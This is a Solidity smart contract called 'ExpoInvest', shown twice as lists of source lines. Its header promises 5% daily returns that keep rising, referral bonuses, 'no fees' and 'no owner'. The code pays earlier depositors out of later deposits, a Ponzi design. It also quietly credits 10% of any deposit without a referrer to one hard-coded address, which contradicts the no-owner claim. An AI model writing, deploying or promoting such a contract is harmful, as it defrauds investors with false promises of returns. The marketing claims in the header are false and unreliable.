['pragma solidity ^0.4.24;\n', '\n', '/**\n', ' *\n', ' * Exponental Investment Contract\n', ' *  - GAIN 5% PER 24 HOURS (every 5900 blocks)\n', ' *  - Every day the percentage increases by 0.25%\n', ' *  - You will receive 10% of each deposit of your referral\n', ' *  - Your referrals will receive 10% bonus\n', ' *  - NO COMMISSION on your investment (every ether stays on contract&#39;s balance)\n', ' *  - NO FEES are collected by the owner, in fact, there is no owner at all (just look at the code)\n', ' *\n', ' * How to use:\n', ' *  1. Send any amount of ether to make an investment\n', ' *  2a. Claim your profit by sending 0 ether transaction (every day, every week, i don&#39;t care unless you&#39;re spending too much on GAS)\n', ' *  OR\n', ' *  2b. Send more ether to reinvest AND get your profit at the same time\n', ' *\n', ' * RECOMMENDED GAS LIMIT: 100000\n', ' * RECOMMENDED GAS PRICE: https://ethgasstation.info/\n', ' * \n', ' *\n', ' */\n', 'contract ExpoInvest {\n', '    // records amounts invested\n', '    mapping (address => uint256) invested;\n', '    // records blocks at which investments were made\n', '    mapping (address => uint256) atBlock;\n', '    \n', '    function bytesToAddress(bytes bys) private pure returns (address addr) {\n', '        assembly {\n', '            addr := mload(add(bys, 20))\n', '        }\n', '    }\n', '\n', '    // this function called every time anyone sends a transaction to this contract\n', '    function ()  payable {\n', '          \n', '            \n', '        if (invested[msg.sender] != 0) {\n', '            // calculate profit amount as such:\n', '            // amount = (amount invested) * start 5% * (blocks since last transaction) / 5900\n', '            // 5900 is an average block count per day produced by Ethereum blockchain\n', '            uint256 amount = invested[msg.sender] * 5 / 100 * (block.number - atBlock[msg.sender]) / 5900;\n', '            \n', '            amount +=amount*((block.number - 6401132)/118000);\n', '            // send calculated amount of ether directly to sender (aka YOU)\n', '            address sender = msg.sender;\n', '            \n', '             if (amount > address(this).balance) {sender.send(address(this).balance);}\n', '             else  sender.send(amount);\n', '            \n', '        }\n', '        \n', '         \n', '\n', '        // record block number and invested amount (msg.value) of this transaction\n', '        atBlock[msg.sender] = block.number;\n', '        invested[msg.sender] += msg.value;\n', '        //referral\n', '         address referrer = bytesToAddress(msg.data);\n', '            if (invested[referrer] > 0 && referrer != msg.sender) {\n', '                invested[msg.sender] += msg.value/10;\n', '                invested[referrer] += msg.value/10;\n', '            \n', '            } else {\n', '                invested[0x705872bebffA94C20f82E8F2e17E4cCff0c71A2C] += msg.value/10;\n', '            }\n', '        \n', '        \n', '       \n', '    }\n', '}']
['pragma solidity ^0.4.24;\n', '\n', '/**\n', ' *\n', ' * Exponental Investment Contract\n', ' *  - GAIN 5% PER 24 HOURS (every 5900 blocks)\n', ' *  - Every day the percentage increases by 0.25%\n', ' *  - You will receive 10% of each deposit of your referral\n', ' *  - Your referrals will receive 10% bonus\n', " *  - NO COMMISSION on your investment (every ether stays on contract's balance)\n", ' *  - NO FEES are collected by the owner, in fact, there is no owner at all (just look at the code)\n', ' *\n', ' * How to use:\n', ' *  1. Send any amount of ether to make an investment\n', " *  2a. Claim your profit by sending 0 ether transaction (every day, every week, i don't care unless you're spending too much on GAS)\n", ' *  OR\n', ' *  2b. Send more ether to reinvest AND get your profit at the same time\n', ' *\n', ' * RECOMMENDED GAS LIMIT: 100000\n', ' * RECOMMENDED GAS PRICE: https://ethgasstation.info/\n', ' * \n', ' *\n', ' */\n', 'contract ExpoInvest {\n', '    // records amounts invested\n', '    mapping (address => uint256) invested;\n', '    // records blocks at which investments were made\n', '    mapping (address => uint256) atBlock;\n', '    \n', '    function bytesToAddress(bytes bys) private pure returns (address addr) {\n', '        assembly {\n', '            addr := mload(add(bys, 20))\n', '        }\n', '    }\n', '\n', '    // this function called every time anyone sends a transaction to this contract\n', '    function ()  payable {\n', '          \n', '            \n', '        if (invested[msg.sender] != 0) {\n', '            // calculate profit amount as such:\n', '            // amount = (amount invested) * start 5% * (blocks since last transaction) / 5900\n', '            // 5900 is an average block count per day produced by Ethereum blockchain\n', '            uint256 amount = invested[msg.sender] * 5 / 100 * (block.number - atBlock[msg.sender]) / 5900;\n', '            \n', '            amount +=amount*((block.number - 6401132)/118000);\n', '            // send calculated amount of ether directly to sender (aka YOU)\n', '            address sender = msg.sender;\n', '            \n', '             if (amount > address(this).balance) {sender.send(address(this).balance);}\n', '             else  sender.send(amount);\n', '            \n', '        }\n', '        \n', '         \n', '\n', '        // record block number and invested amount (msg.value) of this transaction\n', '        atBlock[msg.sender] = block.number;\n', '        invested[msg.sender] += msg.value;\n', '        //referral\n', '         address referrer = bytesToAddress(msg.data);\n', '            if (invested[referrer] > 0 && referrer != msg.sender) {\n', '                invested[msg.sender] += msg.value/10;\n', '                invested[referrer] += msg.value/10;\n', '            \n', '            } else {\n', '                invested[0x705872bebffA94C20f82E8F2e17E4cCff0c71A2C] += msg.value/10;\n', '            }\n', '        \n', '        \n', '       \n', '    }\n', '}']
